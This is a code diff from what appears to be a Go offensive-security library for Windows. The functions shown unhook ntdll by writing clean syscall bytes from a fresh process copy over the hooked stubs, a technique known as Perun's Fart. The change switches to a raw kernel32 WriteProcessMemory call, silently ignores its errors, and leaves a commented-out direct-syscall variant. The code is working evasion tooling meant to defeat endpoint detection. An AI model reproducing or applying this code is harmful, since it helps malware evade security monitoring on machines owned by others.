@@ -58,7 +58,7 @@ func ClassicUnhook(funcname string, dllpath string) (error) {
 
   // Overwrite address with original function bytes
   writeProcessMemory.Call(ownHandle, procAddr2, uintptr(unsafe.Pointer(&assembly_bytes[0])), 5, uintptr(0))
-  
+
   return nil
 }
 
@@ -125,6 +125,8 @@ func FullUnhook(dllpath string) (error) {
 }
 
 func PerunsUnhook() (error) {
+  procWriteProcessMemory := syscall.NewLazyDLL("kernel32.dll").NewProc("WriteProcessMemory")
+
   var si syscall.StartupInfo
   var pi syscall.ProcessInformation
   si.Cb = uint32(unsafe.Sizeof(syscall.StartupInfo{}))
@@ -204,18 +206,19 @@ func PerunsUnhook() (error) {
   endOffset := findLastSyscallOffset(cache, int(secHdr.VirtualSize), addrMod)
   cleanSyscalls := cache[startOffset:endOffset]
 
-  var writenum uintptr
-  e = windows.WriteProcessMemory(
-    0xffffffffffffffff,
-    addrMod+uintptr(startOffset),
-    &cleanSyscalls[0],
-    uintptr(len(cleanSyscalls)),
-    &writenum,
-  )
+  /*ZwWriteVirtualMemory, err := GetSysId("ZwWriteVirtualMemory")
+  if err != nil {
+    return err
+  }*/
 
-  if e != nil {
-    return e
-  }
+  // Don't handle error as it may return false errors
+  procWriteProcessMemory.Call(
+    uintptr(0xffffffffffffffff),
+    uintptr(addrMod + uintptr(startOffset)),
+    uintptr(unsafe.Pointer(&cleanSyscalls[0])),
+    uintptr(len(cleanSyscalls)),
+    0,
+  )
 
   return nil
 }
